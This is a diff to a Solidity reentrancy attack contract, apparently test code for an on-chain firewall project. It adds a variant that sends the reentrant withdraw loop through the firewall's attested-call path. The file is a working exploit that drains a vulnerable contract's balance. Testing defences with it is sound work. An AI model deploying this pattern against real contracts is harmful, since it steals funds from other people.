@@ -6,26 +6,51 @@ interface IReentrancyVulnerable {
     function withdraw() external;
 }
 
+struct Attestation {
+    /// @notice Deadline UNIX timestamp
+    uint256 deadline;
+    /**
+     * @notice Ordered hashes which should be produced at every checkpoint execution
+     * in this contract. An attester uses these hashes to enable a specific execution
+     * path.
+     */
+    bytes32[] executionHashes;
+}
+
+interface IFirewall {
+        function attestedCall(Attestation calldata attestation, bytes calldata attestationSignature, bytes calldata data) external;
+}
+
 contract ReentrancyAttack {
-    IReentrancyVulnerable public vulnerableContract;
+    address public vulnerableContract;
+
+    error WithdrawFundsFailed(address recipient);
 
     constructor(address _vulnerableContract) {
-        vulnerableContract = IReentrancyVulnerable(_vulnerableContract);
+        vulnerableContract = _vulnerableContract;
     }
 
     receive() external payable {
-        while (address(vulnerableContract).balance > 0) {
-            vulnerableContract.withdraw();
+        while (vulnerableContract.balance > 0) {
+            IReentrancyVulnerable(vulnerableContract).withdraw();
         }
     }
 
     function attack() public payable {
         require(msg.value >= 1 ether);
-        vulnerableContract.deposit{value: 1 ether}();
-        vulnerableContract.withdraw();
+        IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
+        IReentrancyVulnerable(vulnerableContract).withdraw();
+    }
+
+    function attackWithAttestation(Attestation calldata attestation, bytes calldata attestationSignature) public payable {
+        require(msg.value >= 1 ether);
+        IReentrancyVulnerable(vulnerableContract).deposit{value: 1 ether}();
+        bytes memory data = abi.encodeWithSelector(IReentrancyVulnerable.withdraw.selector);
+        IFirewall(vulnerableContract).attestedCall(attestation, attestationSignature, data);
     }
 
     function withdrawFunds() public {
-        payable(msg.sender).transfer(address(this).balance);
+        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
+        if (!success) revert WithdrawFundsFailed(msg.sender);
     }
 }
